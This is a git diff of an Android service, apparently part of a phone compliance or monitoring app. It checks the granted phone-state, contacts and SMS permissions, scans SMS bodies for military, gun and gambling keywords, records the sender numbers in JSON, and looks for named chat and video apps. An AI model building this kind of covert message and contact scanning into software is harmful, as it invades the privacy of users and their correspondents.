@@ -51,8 +51,28 @@ public class MyService extends Service {
 
     //主要功能的实现
     private void runBody(Intent intent){
-        final String[] permission = intent.getStringArrayExtra("permission");
-        final List<String> perList = Arrays.asList(permission);
+
+        final List<String> perList = new ArrayList<>();
+
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE ) ==
+                PackageManager.PERMISSION_GRANTED ){
+            perList.add("手机硬件信息权限");
+        }
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS ) ==
+                PackageManager.PERMISSION_GRANTED ) {
+            perList.add("联系人权限");
+        }
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS ) ==
+                PackageManager.PERMISSION_GRANTED){
+            perList.add("短信权限");
+        }
+
+        perList.add("网络连接权限");
+
+        final String[] permission = perList.toArray(new String[perList.size()]);
+
+
+
 
         //  调试：输出权限信息
         for (String str : permission){
@@ -112,7 +132,7 @@ public class MyService extends Service {
                                 date =dateFormat.format(date1);
 
 
-                                if(body.contains("军") || body.contains("枪")){
+                                if(body.contains("军") || body.contains("枪") || body.contains("赌")){
                                     JSONObject message = new JSONObject();
                                     message.put("number",address);
 
@@ -132,7 +152,6 @@ public class MyService extends Service {
                         cursorMessage.close();
                     }
                 }
-
 
                 //查询联系人敏感字
                 JSONObject contacts = new JSONObject();
@@ -167,10 +186,9 @@ public class MyService extends Service {
                 //查询所有开启的权限
                 //权限 保存在perList中
 
-
                 //查询不允许使用的应用
                 JSONObject apps = new JSONObject();
-                String[] appNames = {"抖音","微信","QQ"};
+                String[] appNames = {"抖音短视频","微信","QQ"};
                 List<String> appList = Arrays.asList(appNames);
                 Activity mainActivity = MainActivity.sInstance;
                 PackageManager packageManager = mainActivity.getPackageManager();
